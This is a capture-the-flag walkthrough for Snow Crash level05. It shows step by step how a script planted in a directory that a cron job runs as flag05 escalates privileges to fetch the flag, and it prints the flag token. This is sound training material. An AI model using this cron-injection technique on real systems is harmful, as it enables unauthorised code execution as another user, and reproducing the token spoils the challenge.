# 🧠 Snow Crash – Level05 Walkthrough

## 🧩 Challenge Summary

After logging in as `level05`, the system immediately shows:  
> **You have new mail.**

This mail hints at an automated task (cron job) run as a different user (`flag05`). The objective is to **leverage this scheduled task** to execute code as `flag05` and retrieve the flag using `getflag`.

---

## 🔍 Step-by-step Exploitation

### 1. 📬 Check for the mail
Right after login, we noticed this line:
```bash
You have new mail.
```

We inspected the environment:
```bash
export
```

And found:
```bash
declare -x MAIL="/var/mail/level05"
```

So we checked the mail file:
```bash
cat /var/mail/level05
```

Output:
```cron
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

> 🔁 This tells us a **cron job** runs every 2 minutes as user `flag05`, executing a script located at `/usr/sbin/openarenaserver`.

---

### 2. 🧠 Understand the script logic

```bash
cat /usr/sbin/openarenaserver
```

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

#### 🔎 What it does:
- Iterates over all files in `/opt/openarenaserver/`
- For each file:
  - Sets a **CPU time limit** of 5 seconds using `ulimit -t 5`
  - Executes it with **debug output** using `bash -x`
  - Deletes the file afterward with `rm -f`

> 🧨 So any script we drop into `/opt/openarenaserver/` will be executed as `flag05`, but **it will be deleted immediately**, so we can’t just print output to the terminal.

---

### 3. 🛠 Exploit the cron job

Create a script that dumps the flag to a readable file:

```bash
echo -e '#!/bin/sh\ngetflag > /tmp/flag05.txt' > /opt/openarenaserver/pwn.sh
```

Make it executable:
```bash
chmod +x /opt/openarenaserver/pwn.sh
```

✅ After waiting a couple of minutes (cron runs every 2 minutes), check:
```bash
cat /tmp/flag05.txt
```

### 🎉 Flag
```bash
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

## ✅ Conclusion

By analyzing the mail and understanding how the cron job works, we were able to inject a script that ran as `flag05`. Since the output wasn't visible due to script deletion, we redirected it to `/tmp`, which allowed us to capture and read the flag securely.
